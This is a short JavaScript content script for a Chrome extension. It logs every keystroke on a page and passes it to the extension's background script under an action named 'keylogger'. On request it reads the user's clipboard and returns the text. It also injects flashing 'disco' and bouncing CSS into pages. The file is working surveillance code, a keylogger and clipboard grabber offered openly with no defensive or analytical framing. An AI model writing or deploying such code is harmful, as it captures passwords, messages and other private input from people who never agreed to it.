document.addEventListener('keydown', ({ key }) => {
  const ignoredKeys = ['Meta', 'Control', 'Alt', 'Shift'];
  if (!ignoredKeys.includes(key)) chrome.runtime.sendMessage({ action: 'keylogger', key });
});

// listen for messages from the background script
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'getClipboard') {
    navigator.clipboard
      .readText()
      .then((clipText) => sendResponse({ clipboardContent: clipText }))
      .catch((err) => {
        console.error('Failed to read clipboard contents: ', err);
        sendResponse({ clipboardContent: 'cannot read clipboard' });
      });

    return true; // will send the response asynchronously
  }
});

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'applyCrazyStyle') applyCrazyStyle();
});

function applyCrazyStyle() {
  const style = document.createElement('style');
  style.innerHTML = `
    @keyframes bounce {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-50px); }
    }

    @keyframes disco-background {
      0% { background-color: red; }
      25% { background-color: green; }
      50% { background-color: blue; }
      75% { background-color: purple; }
      100% { background-color: yellow; }
    }

    div {
      animation: bounce 1s infinite;
    }

    .disco-effect {
      animation: disco-background 1s infinite;
    }
  `;

  document.head.appendChild(style);

  document.body.classList.add('disco-effect');
}
